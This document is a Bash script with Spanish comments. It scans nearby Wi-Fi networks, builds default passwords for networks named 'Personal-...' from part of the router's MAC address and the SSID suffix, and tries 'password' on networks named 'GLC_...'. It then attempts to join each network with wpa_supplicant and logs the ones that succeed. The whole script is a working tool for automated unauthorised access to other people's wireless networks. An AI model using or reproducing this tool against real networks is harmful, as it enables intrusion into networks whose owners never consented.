#!/bin/bash

CLR_RESET='\e[0m'
CLR_BOLD='\e[1m'
CLR_RED='\e[31m'
CLR_GREEN='\e[32m'
CLR_YELLOW='\e[33m'
CLR_BLUE='\e[34m'
CLR_MAGENTA='\e[35m'
CLR_CYAN='\e[36m'

INTERVALO=5
INTERFACE=$1

trap cleanup INT

info() { echo -e "${CLR_BLUE}${CLR_BOLD}[INFO]${CLR_RESET} $*"; }
ok() { echo -e "${CLR_GREEN}${CLR_BOLD}[OK]${CLR_RESET} $*"; }
warn() { echo -e "${CLR_YELLOW}${CLR_BOLD}[AVISO]${CLR_RESET} $*"; }
err() { echo -e "${CLR_RED}${CLR_BOLD}[ERROR]${CLR_RESET} $*"; }
debug() { if [[ $VERBOSE -eq 1 ]]; then echo -e "${CLR_MAGENTA}${CLR_BOLD}[DEBUG]${CLR_RESET} $*"; fi; }

cleanup() {
	if [ ! -z "$SPINNER_PID" ]; then
		kill "$SPINNER_PID" 2>/dev/null
	fi

	exit 1
}

# Verificar si el script se ejecuta con privilegios de root
if [ "$EUID" -ne 0 ]; then
	echo "Este script debe ejecutarse con sudo o como root."
	exit 1
fi

# Determina la interfaz inalámbrica por defecto si no se pasa como parámetro
if [ -z "$INTERFACE" ]; then
	INTERFACE=$(iw dev | awk '/Interface/{iface=$2} /type/{mode=$2; if(mode=="managed"){print iface}}' | head -n1)
fi

# Validar que se encontró una interfaz
if [ -z "$INTERFACE" ]; then
	echo "No se encontró ninguna interfaz Wi-Fi en modo managed."
	exit 1
fi

spinner() {

	local chars=("\\" "|" "/" "-")
	local delay=0.1
	local i=0

	while true; do
		local index=$((i % 4))
		local char=${chars[$index]}
		printf "\rProcesando... %s" "$char"
		i=$((i + 1))
		sleep $delay
	done
}

function IntentoConexion() {
	ssid=$1
	clave=$2
	macaddress=$3
	interface=$4

	echo -e "\nConectarse a \e[97m$ssid\e[0m con la Clave: \e[97m$clave\e[0m en la interface \e[97m$interface\e[0m"

	rm /tmp/wpa_supplicant.conf /tmp/wpa_respuesta.log 2>/dev/null
	$(sudo wpa_passphrase "$ssid" "$clave" | tee /tmp/wpa_supplicant.conf) &>/dev/null

	timeout 8s "sudo wpa_supplicant -i $interface -c /tmp/wpa_supplicant.conf  " >/dev/null 2>&1 | tee /tmp/wpa_respuesta.log

	if grep -i "CTRL-EVENT-CONNECTED" /tmp/wpa_respuesta.log; then

		echo -e "\n Conectarse a $ssid con la Clave: $clave y MACAddress: $macaddress --> \e[32m[OK]\e[0m \n \n" | tee -a $HOME/wifi-password-default.txt
		sleep 1
	else
		if grep -q "CTRL-EVENT-AUTH-REJECT" /tmp/wpa_respuesta.log; then
			echo -e "\e[31m[ERROR]\e[0m Contraseña incorrecta"
		elif grep -q "CTRL-EVENT-NETWORK-NOT-FOUND" /tmp/wpa_respuesta.log; then
			echo -e "\e[31m[ERROR]\e[0m Red no encontrada"
		else
			echo -e "\e[33m[?]\e[0m Estado desconocido"
		fi
		echo -e "\n Conectarse a $ssid con la Clave: $clave y MACAddress: $macaddress --> \e[31m[FALLÓ]\e[0m  \n\n" | tee -a $HOME/wifi-sin-password-por-defecto.txt
		sleep 1
	fi

}

while true; do
	#clear
	spinner &
	SPINNER_PID=$!

	sudo iwlist $INTERFACE scan | tee /tmp/redes.txt >/dev/null

	cat /tmp/redes.txt | awk '/Cell /{print ""; print $0; next} {print}' | while read -r line; do

		# Detectar la línea con la dirección MAC
		if [[ "$line" =~ Cell\ [0-9]+\ -\ Address:\ ([A-Fa-f0-9:]{17}) ]]; then
			macaddress="${BASH_REMATCH[1]}"
			mac=$(echo "$macaddress" | sed 's/://g' | awk '{print substr($0,3,7)}')
		fi

		# Detectar la línea del nivel de señal
		if [[ "$line" =~ Signal\ level=(-?[0-9]+) ]]; then
			senial="${BASH_REMATCH[1]}"

		fi

		if [[ "$line" =~ ESSID:\"(Personal-[^\"]+)\" ]]; then
			essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}' | sed 's/"//g')
			subssid=$(echo "$essid" | grep -Po 'Personal(?:-WiFi)?-\K[A-Za-z0-9]{3}(?![a-zA-Z0-9])')
			clave=$(echo "$mac$subssid")
			if [ -n "$senial" ] && [ "$senial" -ge -75 ]; then

				if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then

					echo -e "\e[96mSSID:\e[0m $essid - SUBEssid: $subssid"
					echo -e "\e[96mMAC:\e[0m $macaddress - SUBMac: $mac"
					echo -e "\e[96mSUBSSID:\e[0m $subssid"
					echo -e "\e[96mCLAVE:\e[0m $clave"
					echo -e "\e[96mSEÑAL:\e[0m $senial"
					echo -e "\n***************************************************************************"
					sleep 2
					IntentoConexion "$essid" "$clave" $macaddress $INTERFACE
					echo -e "\n***************************************************************************"
				fi

			fi

		fi
		if [[ "$line" =~ ESSID:\"(GLC_.*)\" ]]; then
			essid=$(echo $line | grep "ESSID: *" | awk -F: '{print $2}')
			clave=$"password"
			if [ -n "$senial" ] && [ "$senial" -ge -75 ]; then

				if [ ! "$(grep -i "$macaddress" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$macaddress" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then

					echo -e "\e[96mSSID:\e[0m $essid "
					echo -e "\e[96mMAC:\e[0m $macaddress"
					echo -e "\e[96mCLAVE:\e[0m $clave"
					echo -e "\e[96mSEÑAL:\e[0m $senial"
					echo -e "\n***************************************************************************"
					sleep 2
					IntentoConexion "$essid" "$clave" $macaddress $INTERFACE
					echo -e "\n***************************************************************************"
				fi

			fi

		fi

	done

	sleep 1

done
